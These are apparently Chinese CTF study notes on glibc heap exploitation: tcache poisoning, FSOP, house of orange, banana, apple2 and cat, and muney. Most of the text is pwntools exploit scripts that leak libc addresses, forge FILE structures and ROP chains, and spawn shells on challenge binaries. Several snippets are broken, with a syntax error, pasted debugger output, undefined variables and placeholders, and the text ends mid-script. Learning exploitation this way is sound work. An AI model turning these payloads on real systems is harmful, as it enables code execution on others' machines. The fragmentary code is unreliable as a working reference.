tcache 看你free的堆块是否有bk指针（带有tcachebin堆块信息的那种）
fastbin 看你free的堆块是否是头节点      更容易绕过，用于没有edit功能的时候


### malloc(<=0xff)+UAF

0xff在fastbin范围外的，易于得到unsortbin，结合show功能易于获得libc地址
功能健全，又能使用tcache，利用poison即可利用

```python
def add(idx,size):
    sla(">",1)
    sla("Index: ",idx)
    sla("Size: ",size)

def edit(idx,con):
    sla(">",3)
    sla("Index: ",idx)
    p.sendafter("Content: ",con)

def show(idx):
    sla(">",4)
    sla("Index: ",idx)

def dele(idx):
    sla(">",2)
    sla("Index: ",idx)



# 填充tcache，释放一个到unsortbin
for i in range(8):
    add(i, 0x90)# 0-7
add(8, 0x20)# 防止合并，后面用于补一个tcache位置
for i in range(8):
    dele(i)
# 泄露堆地址
show(0)
key = u64(p.recv(5).ljust(8,'\x00'))
lg('key')
heap_base = key<<12
lg('heap_base')
# 泄露libc地址
edit(7, 'a')# main_arena低地址为\x00
show(7)
libc_base = l64() - 0x1e3c61
lg('libc_base')
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
edit(7, '\x00')# 恢复

# 切割unsortbin，构造tcache poison
add(9, 0x20)
add(10, 0x20)
edit(10, "/bin/sh\x00")# 放binsh

dele(8)# 
dele(9)# 9-> 8

edit(9, p64(free_hook ^ key))
add(11, 0x20)
add(12, 0x20)
edit(12, p64(system_addr))

dele(10)
ia()
```


### IO利用

特殊的堆利用手段，用于在特定情况下根据堆漏洞一流程的完成获取flag

#### 修改Linkmap程序基地址&fini_array

劫持Linkmap链表中存放的程序基地址为one_gadget地址-0x3d70(fini_array_addr)，导致触发fini_array时触发one_gadget




```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./manageheap")
elf = ELF("./manageheap")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size,name,id_con='a'):
    sla("Your Choice:",1)
    sla("please input your major's number:",size)
    p.sendafter("please input your name:",name)
    sa("> \n",id_con)

def show(idx):
    sla("Your Choice:",3)
    sla("input your idx:",idx)

def edit(idx,id_con,new_con):
    sla("Your Choice:",4)
    sla("input your idx:",idx)
    sa("please input your id:",id_con)
    s(new_con)

def dele(idx):
    sla("Your Choice:",2)
    sla("input your idx:",idx)

# 拿地址
heap_base = uu64()-0x2d0
lg('heap_base')
key = heap_base>>12
lg('key')
libc_base = l64()-0x219c61-0x500
lg('libc_base')
link_map = libc_base + 0x2652e0 # search -p "0x5588228e5000" ，然后去看

pwndbg> tel 0x7f651f76f2c0
00:0000│  0x7f651f76f2c0 —▸ 0x5588228e5000 ◂— 0x10102464c457f   0x7f651f76f2c0这个就是
01:0008│  0x7f651f76f2c8 —▸ 0x7f651f76f880 ◂— 0x0    这个位置是名字，程序本身就是空
02:0010│  0x7f651f76f2d0 —▸ 0x5588228ec000 ◂— 0x1d   这里都是1d
03:0018│  0x7f651f76f2d8 —▸ 0x7f651f76f890(这个地址就是next_loadbanana的) —▸ 0x7ffd2b13a000 ◂— jg 0x7ffd2b13a047
04:0020│  0x7f651f76f2e0 ◂— 0x0
05:0028│  0x7f651f76f2e8 —▸ 0x7f651f76f2c0 —▸ 0x5588228e5000 ◂— 0x10102464c457f
06:0030│  0x7f651f76f2f0 ◂— 0x0
07:0038│  0x7f651f76f2f8 —▸ 0x7f651f76f868 —▸ 0x7f651f76f880 ◂— 0x0


lg("link_map")
one = libc_base + 0xebcf1

edit(1,p64((heap_base+0xc20)^key),p64(link_map^key))
add(0x49,'a'*0x10)# 5
add(0x49,p64(one)'放one',p64(heap_base+0x740-0x3D70))# 6

# exit

ia()
```

#### 通过_IO_buf_base任意写

利用前提是 libc任意地址写'\x00' 一个即可
(注意：对IO_buf_base（即缓冲区）写内容的时候要用send! （scanf除外）)

原理：
当可以实现任意地址写0时，可以将stdin的IO_buf_base的低位设置为0，这样可以使得下次**再使用IO输入函数**进行输入时就会在IO_buf_base上方进行输入从而覆盖IO_buf_base的值，**再次使用IO输入函数**就能实现任意地址写了
通常会结合直接写IO_stdout结构体实现触发houseofapple2
详细如下
执行类scanf IO输入函数时，最终会执行

```c
count = _IO_SYSREAD(fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base);
```

即**输入缓冲区**在内存中的`fp->_IO_buf_base`这个地址
\_IO_2_1_stdin_的原本值可能就是_IO_2_1_stdin_附近的值，因此若我们写_IO_buf_base的最低字节为0，那么我们很有可能可以**让_IO_buf_base和_IO_buf_end之间包括_IO_buf_base**，从而实现任意地址写

```python
# step 2 : printf -> stdout -> house of apple2

environ = libc_base + libc.sym['__environ']
system = libc_base + libc.sym['system']
bin_sh = libc_base + libc.search('/bin/sh\x00').next()
stdin = libc_base + libc.sym['_IO_2_1_stdin_']
stdin_IO_buf_base = stdin + 7*8
stdin_old_value = stdin + 0x83
stdout = libc_base + libc.sym['_IO_2_1_stdout_']
stderr = libc_base + libc.sym['_IO_2_1_stderr_']
_IO_wfile_jumps = libc_base + 0x202228


base_addr = stdout
fake_io = b'  sh;\x00\x00\x00' # fad0x1800 rdi
fake_io = fake_io.ljust(0x68, b'\x00')
fake_io += p64(system)
fake_io = fake_io.ljust(0x88, b'\x00')
fake_io += p64(base_addr + 0x5000) # _lock
fake_io += p64(0)*2
fake_io += p64(base_addr)
fake_io = fake_io.ljust(0xd8, b'\x00')
fake_io += p64(_IO_wfile_jumps - 0x20)
fake_io = fake_io.ljust(0xe0, b'\x00')
fake_io += p64(base_addr)

sla(b'> ', b'2')
sla(b'Mem: ', hex(stdin_IO_buf_base))# 利用功能将stdin io_buf_base低位置为0
# 回到输入选项的getchar()即scanf
sa(b'> ', p64(stdin_old_value)*3 + p64(base_addr) + p64(base_addr + len(fake_io)+1))# 一直输入直到IO_buf_base修改为stdout结构体的地址

sl(fake_io)
```

注意：
特别的情况下，在覆盖IO_buf_base以后，再进行IO输入时，由于设置的缓冲区位置太远会存在检测

```c
if (fp->_IO_read_ptr < fp->_IO_read_end)
	return *(unsigned char *)fp->_IO_read_ptr;
// 假如_IO_read_ptr<_IO_read_end就不能执行到我们的read
```

这时要使用到

```c
IO_getc(stdin); //清除缓冲区中scanf留下的换行符
or
getchar();//可以输入满输入缓冲区
//从输入缓冲区中读取一个字符并返回该字符。在读取一个字符后，缓冲区中对应的空间就会被释放
```

使用后会使得_IO_read_ptr+1，反复使用直到与end相等
#### mp_.tcache_bins

漏洞点：mp_.tcache_bins可被写为一个大值

```python
add(size)# 这里size要>0x430
# 布置位：heap_base + (size>>4 *8)+0x88

add(0, 0x528)
add(1, 0x600)
add(2, 0x518)

dele(0)
add(3,0x900)
show(0)
libc_base = l64()-0x1e4030
main_arena = libc_base+0x1e4030
lg('libc_base')
mp_ = libc_base + 0x1e3280 # p &mp_
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
lg('mp_')

edit(0,'a'*0x10)
show(0)
ru("a"*0x10)
heap_base = uu64()-0x290
lg('heap_base')
key = heap_base>>12
lg('key')

edit(0,p64(main_arena)*2)
dele(2)
pay = p64(main_arena)*2 + p64(0) + p64(mp_+0x50-0x20)
edit(0,pay)
add(3,0x900)
# -------------------------------------------------------------------
# ---Largebinattack后

dele(1)# 0x600
edit(0,"a"*0xe8 + p64(free_hook))

add(1,0x600)
edit(1, p64(system_addr))
edit(0, "/bin/sh\x00")
dele(0)
ia()
```



![image-20220409223332707](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220409223332707.png)

![image-20220403180012397](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220403180012397.png)

`0x0000564ce2ed6000+0x90`

#### global_fast

漏洞点：global_fast可被写为一个大值

在可以申请0xffff类大堆的情况下(**任意地址写任意值**，任意值要求能UAF)

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./heap2019")
elf = ELF("./heap2019")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size,con='a'):
    sla("4.exit",1)
    sla("Content length:",size)
    p.sendafter("Content:",con)

def edit(con):
    sla("4.exit",2)
    p.sendafter("Comment:",con)

def dele(idx):
    sla("4.exit",3)
    sla("Content id:",idx)

# 漏洞点是任意地址写deadbeef
sla("4.exit",2019)
p.recvuntil("0x")
base = int(p.recv(12),16)-0x202040
lg('base')

add(0x410,'a')# 0
add(0x400,'a')# 1
add(0x420,'a')# 2
add(0x408,'a'*0x400+'/bin/sh\x00')# 3 伪造IO

dele(0)
dele(2)
add(0x2333,'a')# 0
add(0x420,'a')# 2
ru("Data is:\n")
heap_base = uu64()-0x61
lg('heap_base')

add(0x410,'a')# 4
ru("Data is:\n")
libc_base = l64()-0x3c4f00-0x61
lg('libc_base')
system = libc_base + libc.sym['system']
IO_list_all = libc_base + 0x3c5520
lg('IO_list_all')
global_max_fast = libc_base + 0x3c67f8
# ---------------------------------------------
# p &main_arena.fastbinsY
# p &global_max_fast
add(size) 
# delta = IO_list_all/free_hook - main_arena.fastbinsY_addr
# size = (delta * 2) + 0x10
pay = IO_FILE
edit(chunk,pay)
# 一段攻击
dele(chunk) # 写入堆地址
# 二段攻击,利用UAF
# edit(chunk,p64(system))
# add(chunk)//写入system


dele(0)
vtable = heap_base + 0x001150
pay = p64(0)*2
pay += p64(0) + p64(1)
pay = pay.ljust(0xC0,'\x00')
pay += p64(0)+p64(vtable)
# vtable
pay += p64(0)*3
pay += p64(system)
add(0x1400,pay)# 0

edit('a'*0x20+p64(global_max_fast))
dele(0)# IO_list_all写入堆地址

sla("4.exit", '4')
ia()
```

#### FSOP

##### 劫持stdout等结构体触发FSOP

常规FSOP通过exit等函数触发，也可以通过以下链触发

```
printf -> stdout -> house of apple2
```

```shell
 ► 0   0x7f8179d44cb5 __printf_buffer_to_file_done+213
   1   0x7f8179d44cb5 __printf_buffer_to_file_done+213
   2   0x7f8179d4f733 __vfprintf_internal+579
   3   0x7f8179d441a3 printf+179
   4   0x563be4b3e2c3 main+163
```

参考IO_buf_base任意地址写

##### 2.23版本

原理：
FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：
1. 当 libc 执行 abort 流程时
2. 当执行 exit 函数时
3. 当执行流从 main 函数返回时

```python
system = libc_base + libc.sym['system']

vtable = heap_base + 0x001150
# pay = '/bin/sh\x00'+p64(size)
pay += p64(0)*2 # 可被修改
pay += p64(0) + p64(1)
pay = pay.ljust(0xC0,'\x00')
pay += p64(0)+p64(vtable)
# vtable
pay += p64(0)*3
pay += p64(system)# one_gadget
```

##### 2.27版本(IO_str_jumps固定跳表)

```python
def FILE(binsh,system,IO_str_jumps):
	fake_IO_FILE  = p64(0xfbad1800) + p64(0)*3
	fake_IO_FILE += p64(0) + p64(0xffffffffffffffff) # fp->_IO_write_ptr > fp->_IO_write_base; pos >= (_IO_size_t) (_IO_blen (fp) + flush_only)
	fake_IO_FILE += p64(0)*2 + p64((binsh-100)//2)
	fake_IO_FILE = fake_IO_FILE.ljust(0xC0,'\x00')
	fake_IO_FILE += p64(0) + p64(0)*2	# _mode <= 0
	fake_IO_FILE += p64(IO_str_jumps)
	fake_IO_FILE += p64(system) # 0xe0 
	return fake_IO_FILE

```

##### 2.39版本(house of apple2结构体)

```python
_IO_wfile_jumps = libc_base + 0x202228

base_addr = stdout

fake_io = b'  sh;\x00\x00\x00' 
fake_io = fake_io.ljust(0x68, b'\x00')
fake_io += p64(system)
fake_io = fake_io.ljust(0x88, b'\x00')
fake_io += p64(base_addr + 0x5000) # _lock
fake_io += p64(0)*2
fake_io += p64(base_addr)
fake_io = fake_io.ljust(0xd8, b'\x00')
fake_io += p64(_IO_wfile_jumps - 0x20)
fake_io = fake_io.ljust(0xe0, b'\x00')
fake_io += p64(base_addr)
```

##### 2.36版本(house of cat结构体)

只需修改**fake_io_addr**地址，**\_IO_save_end**为想要调用的函数，**\_IO_backup_base**为执行函数时的rdx，以及修改_flags为执行函数时的rdi;

![图片描述](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/959842_JDJKTRK7GJUEUFR.png)

```python
setcontext = libc_base + libc.sym['setcontext'] + 61
IO_wfile_jumps = libc_base + 0x1f30a0
one_gadget = libc_base + 0x105fb7

heap_base = libc_base-0x034000 # heap_base
fake_io_addr = heap_base+0x10 # IO_list_all放的地址

next_chain = 0
fake_IO_FILE  = p64(0xfbad1800) + p64(0) # _flag = '/bin/sh'/rdi
fake_IO_FILE += p64(0)*2
fake_IO_FILE += p64(0)+p64(0xffffffffffffffff)
fake_IO_FILE += p64(0)+p64(0)
fake_IO_FILE += p64(1)+p64(2)
fake_IO_FILE += p64(fake_io_addr+0xb0) # _IO_backup_base = setcontext_rdx/rdx
fake_IO_FILE += p64(one_gadget) # _IO_save_end = call addr(call setcontext)
fake_IO_FILE =  fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0) # _chain
fake_IO_FILE =  fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heap_base) # _lock = a writable address
fake_IO_FILE =  fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE += p64(fake_io_addr+0x30) #_wide_data,rax1_addr
fake_IO_FILE =  fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(1) 
fake_IO_FILE =  fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(IO_wfile_jumps+0x30)  # vtable
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

sl(fake_IO_FILE)
# sl(fake_IO_FILE[0x10:])

```



#### house of orange

适用范围：2.23——2.26
没有 free，可以 unsortedbin attack

利用原理：
先利用sysmalloc_int_free的技巧，将原来的topchunk放入unsortbin中（被free的旧topchunksize还要减去FENCEPOST一般为0x20）
再利用堆溢出修改这个free的topchunk为下面结构体
申请非 0x60 大小的 chunk 的时候，首先触发 unsortedbin attack，将_IO_list_all 修改为 main_arena+88，然后 unsortedbin chunk 会进入到 smallbin，大小为 0x60；接着遍历 unsortedbin 的时候触发了 malloc_printerr，然后调用链为： malloc_printerr -> libc_message -> abort -> \_IO_flush_all_lockp，调用到伪造的 vtable 里面的函数指针
在 glibc-2.24 后加入了 vtable 的 check，不能任意地址伪造 vatble 了，但是可以利用 IO_str_jumps 结构进行利用。
在 glibc-2.26 后，malloc_printerr 不再刷新 IO 流了，所以该方法失效

![image-20220507104532095](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220507104532095.png)




#### house of banana

注意：
* 找地址参照<Linkmap程序基地址>
* 这条链还会校验写在rtld_global上堆地址 + 0x3e0的位置，所以要保持大范围的清洁，选择放置IO结构体的位置要谨慎
* rtld_global上写的堆地址是head头的地址
* 要伪造head头fake_heap_addr + 0x20！
* 结构体大小0x334是相对于rtld_global上堆地址+0x10的，注意变换大小

利用链：

```c
exit-> __run_exit_handlers->_dl_fini->_dl_fini+520(setcontext)

进  _dl_fini
2.36以上是call rax   可参考 /mnt/hgfs/ctf/hgame/without_hook
2.30是call rdx

```

##### 2.31-2.36

```python
# UAF
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("week-4.hgame.lwsec.cn","31435")
p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(idx,size):
    sla(">",1)
    sla("Index: ",idx)
    sla("Size: ",size)

def edit(idx,con):
    sla(">",3)
    sla("Index: ",idx)
    p.sendafter("Content: ",con)

def show(idx):
    sla(">",4)
    sla("Index: ",idx)

def dele(idx):
    sla(">",2)
    sla("Index: ",idx)

# ----------------------leak addr--------------------------
add(0,0x520)# big
add(1,0x508)
add(2,0x508)# small IO_FILE

dele(0)
add(3,0x900)
show(0)
libc_base = l64()-0x1f70f0
main_arena = libc_base + 0x1f70f0 # largebin_mainarena
rtld_global = libc_base+0x23d020 # p &_rtld_global
setcontext = libc_base + libc.sym['setcontext'] + 61
ret = libc_base + libc.sym['setcontext'] + 0x14E
setcontext = libc_base + libc.sym['setcontext'] + 61
ret = libc_base + libc.sym['setcontext'] + 0x14E
pop_rdi = libc_base + 0x0000000000023ba5
bin_sh = libc_base + libc.search('/bin/sh\x00').next()
system =  libc_base + libc.sym['system']
pop_rdi = libc_base + 0x0000000000023ba5
pop_rsi = libc_base + 0x00000000000251fe
pop_rdx_r12 = libc_base + 0x000000000008bbb9
lg('ret')
lg('libc_base')
lg('rtld_global')
lg('ret')
# dbg()

edit(0,'a'*0x10)
show(0)
ru("a"*0x10)
heap_base = uu64()-0x290
lg('heap_base')
key = heap_base>>12
lg('key')
# -----------------------largebin attack-----------------------
edit(0,p64(main_arena)*2)
dele(2)
edit(0,p64(main_arena)*2 + p64(0) + p64(rtld_global-0x20))
add(3,0x900)


# -----------------------house of banana--------------------
fake_heap_addr = heap_base+0xcd0 # rtl_global填的地址一般指向堆的head头
next_load = libc_base + 0x21c790

payload  = p64(0) + p64(next_load) 
payload += p64(0) + p64(fake_heap_addr)
payload += p64(setcontext) + p64(ret) # rdx_addr/call rdx

payload += p64(heap_base) + p64(ret)
payload += p64(pop_rsi) + p64(setcontext)
payload += p64(pop_rsi) + p64(0x10000)
payload += p64(pop_rdx_r12) + p64(7)*2
payload += p64(mprotect) + p64(heap_base+0x001b00)# shellcode_addr
payload = payload.ljust(0xc8,'\x00')

# payload += p64(bin_sh)
# payload += p64(ret)
# payload += p64(system)
# payload = payload.ljust(0xc8,'\x00')

payload += p64(fake_heap_addr + 0x28 + 0x18) # rdx+0xa0
payload += p64(pop_rdi) # rdx+0xa8
payload = payload.ljust(0x100,'\x00')
payload += p64(fake_heap_addr + 0x10 + 0x110)*0x3
payload += p64(0x10)
# payload = payload.ljust(0x334 - 0x10,'\x00')# 2.36
# payload += '\x10'
payload = payload.ljust(0x31C - 0x10,'\x00')# under 2.36
payload += '\x08'

edit(2,payload)# part2
edit(1,'a'*0x500+p64(fake_heap_addr + 0x20))# part1
edit(3,shellcode)
print(hex(len(shellcode)))
sla(">",5)# exit

ia()
```

##### 2.37以上

```python
fake_heap_addr = heap_base + 0xbf0# rtl_global填的地址一般指向堆的head头
next_load = libc_base + xxx

payload  = p64(0) + p64(next_load)
payload += p64(0) + p64(fake_heap_addr)
payload += p64(libc_base+0x0000000000157c3a) + p64(ret)
# 0x0000000000157c3a : mov rdx, rbp ; mov rdi, r13 ; call qword ptr [rax + 0x20]
# payload += p64(bin_sh) + p64(ret)
# payload += p64(system) + p64(setcontext)
# payload += p64(0) + p64(0)
# payload += p64(0) + p64(0)
# payload += p64(0) + p64(0)
# payload += p64(0) + p64(0)

payload += p64(heap_base) + p64(ret)
payload += p64(pop_rsi) + p64(setcontext)
payload += p64(pop_rsi) + p64(0x10000)
payload += p64(pop_rdx) + p64(7)
payload += p64(mprotect) + p64(heap_base+0x001550)# shellcode_addr
payload += p64(0) + p64(0)

payload += p64(fake_heap_addr + 0x28 + 0x18)# 0xa0 rsp
payload += p64(pop_rdi)# 0xa8 rcx
payload = payload.ljust(0x100,'\x00')
payload += p64(fake_heap_addr + 0x10 + 0x110)*0x3
payload += p64(0x10)
payload = payload.ljust(0x334 - 0x10,'\x00')
payload += '\x10'

edit(2,payload)
edit(1,'a'*0x420 + p64(fake_heap_addr + 0x20))# call setcontext 
# dbg('b _dl_call_fini\nc\n')

sla('>>','5')
sla('name:','e4l4')
```

#### house of muney
elf文件基础
开头的地方是ELF Header 会记录程序的入口
然后就是PHT program header table, 每个PHT条目对应着文件中的一段数据段或程序段，它描述了段的位置、大小、权限等信息（注意是段信息，段是程序加载的基本单位）
段的类型有以下
PT_LOAD：可加载的段
PT_DYNAMIC：动态段（比如动态链接信息）
PT_INTERP：解释器路径
PT_NOTE：注释信息等

而节是一个存储单位，简单来说就是数据存储，主要有符号表、字符串表、调试信息，不同的节有不同的功能

```
Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .note.gnu.build-i NOTE             0000000000000358  00000358
       0000000000000024  0000000000000000   A       0     0     4
  [ 2] .note.ABI-tag     NOTE             000000000000037c  0000037c
       0000000000000020  0000000000000000   A       0     0     4
  [ 3] .gnu.hash         GNU_HASH         00000000000003a0  000003a0
       0000000000000034  0000000000000000   A       4     0     8
  [ 4] .dynsym           DYNSYM           00000000000003d8  000003d8
       00000000000001b0  0000000000000018   A      27     1     8
  [ 5] .gnu.version      VERSYM           0000000000000676  00000676
       0000000000000024  0000000000000002   A       4     0     2
  [ 6] .gnu.version_r    VERNEED          00000000000006a0  000006a0
       0000000000000040  0000000000000000   A      27     1     8
  [ 7] .rela.dyn         RELA             00000000000006e0  000006e0
       0000000000000108  0000000000000018   A       4     0     8
  [ 8] .rela.plt         RELA             00000000000007e8  000007e8
       00000000000000d8  0000000000000018  AI       4    21     8
  [ 9] .init             PROGBITS         0000000000001000  00001000
       000000000000001b  0000000000000000  AX       0     0     4
  [10] .plt              PROGBITS         0000000000001020  00001020
       00000000000000a0  0000000000000010  AX       0     0     16
  [11] .plt.got          PROGBITS         00000000000010c0  000010c0
       0000000000000010  0000000000000010  AX       0     0     16
  [12] .plt.sec          PROGBITS         00000000000010d0  000010d0
       0000000000000090  0000000000000010  AX       0     0     16
  [13] .text             PROGBITS         0000000000001160  00001160
       0000000000000725  0000000000000000  AX       0     0     16
  [14] .fini             PROGBITS         0000000000001888  00001888
       000000000000000d  0000000000000000  AX       0     0     4
  [15] .rodata           PROGBITS         0000000000002000  00002000
       00000000000003c8  0000000000000000   A       0     0     8
  [16] .eh_frame_hdr     PROGBITS         00000000000023c8  000023c8
       000000000000007c  0000000000000000   A       0     0     4
  [17] .eh_frame         PROGBITS         0000000000002448  00002448
       00000000000001e8  0000000000000000   A       0     0     8
  [18] .init_array       INIT_ARRAY       0000000000003de8  00002de8
       0000000000000008  0000000000000008  WA       0     0     8
  [19] .fini_array       FINI_ARRAY       0000000000003df0  00002df0
       0000000000000008  0000000000000008  WA       0     0     8
  [20] .got              PROGBITS         0000000000003fd8  00002fd8
       0000000000000028  0000000000000008  WA       0     0     8
  [21] .got.plt          PROGBITS         0000000000004000  00003000
       0000000000000060  0000000000000008  WA       0     0     8
  [22] .data             PROGBITS         0000000000004060  00003060
       0000000000000018  0000000000000000  WA       0     0     8
  [23] .bss              NOBITS           0000000000004080  00003078
       0000000000000840  0000000000000000  WA       0     0     32
  [24] .comment          PROGBITS         0000000000000000  00003078
       000000000000002b  0000000000000001  MS       0     0     1
  [25] .shstrtab         STRTAB           0000000000000000  000030a3
       0000000000000113  0000000000000000           0     0     1
  [26] .dynamic          DYNAMIC          0000000000005000  00004000
       00000000000001f0  0000000000000010  WA      27     0     8
  [27] .dynstr           STRTAB           00000000000051f0  000041f0
       000000000000012a  0000000000000000   A       0     0     8
  [28] .interp           PROGBITS         0000000000005320  00004320
       0000000000000051  0000000000000000   A       0     0     8
  [29] .note.gnu.propert NOTE             0000000000005378  00004378
       0000000000000020  0000000000000000   A       0     0     8
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)
```


其中的重定位节有 .rela.dyn和.rela.plt，每个条目包含一个 r_offset（目标地址偏移）和 r_info（符号索引和重定位类型）
会根据r_info中存放的idx来确定plt跳表的idx
Lazing bind 在搜索函数时，先根据跳表执行到dl函数，处理完后得到函数名，再去.dynstr(ELF Strings Table)中搜索对应的函数名，在.dynsym(ELF Symbol Table)中查找名字对应的真实地址写入got表，此后不再访问.dynsym，从got表执行
整个过程访问2次.dynsym
.plt节和.plt.got/.plt.sec节的区别在于是否用lazy bind


![](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/2020071611211031.png)

原理：

在libc上方申请大堆，修改其size位，再free就会导致libc部分被free（反馈为libc空间减小）
再申请回来即可，此时会被填充为0需要伪造，劫持.dynsym(ELF Symbol Table)中对应函数的真实地址即可

```python
'''
    0x7fc20e17a000     0x7fc20e1b9000 rw-p    3f000      0 [anon_7fc20e17a]
    0x7fc20e1b9000     0x7fc20e1db000 r--p    22000      0 /home/ef4tless/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc-2.31.so
'''

add(0, 0x40000-0x2000)# 00007f8955828000     0000000000000000 000000000003f002
edit(0,-8, p64(0x41002 + 0x5000 + 0x4000))
dele(0)
add(0, 0x41000 * 2 + 0x4000)

'''
    0x7fc20e13d000     0x7fc20e1c4000 rw-p    87000      0 [anon_7fc20e13d]
    0x7fc20e1c4000     0x7fc20e1db000 r--p    17000   b000 /home/ef4tless/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc-2.31.so
'''

base_off =  0x7bff0
one_gadget = [0xe3afe, 0xe3b01, 0xe3b04][1]
gnu_hash_section = libc.get_section_by_name('.gnu.hash')
dynsym_section = libc.get_section_by_name('.dynsym')
dynstr_section = libc.get_section_by_name('.dynstr')
namehash = gnu_hash_section.gnu_hash('exit')
bloom_off = gnu_hash_section['sh_addr'] + 4 * gnu_hash_section._wordsize
bucket_off = bloom_off + gnu_hash_section.params['bloom_size'] * gnu_hash_section._xwordsize
bloom_elem_idx = int(namehash /gnu_hash_section.elffile.elfclass) % gnu_hash_section.params['bloom_size']
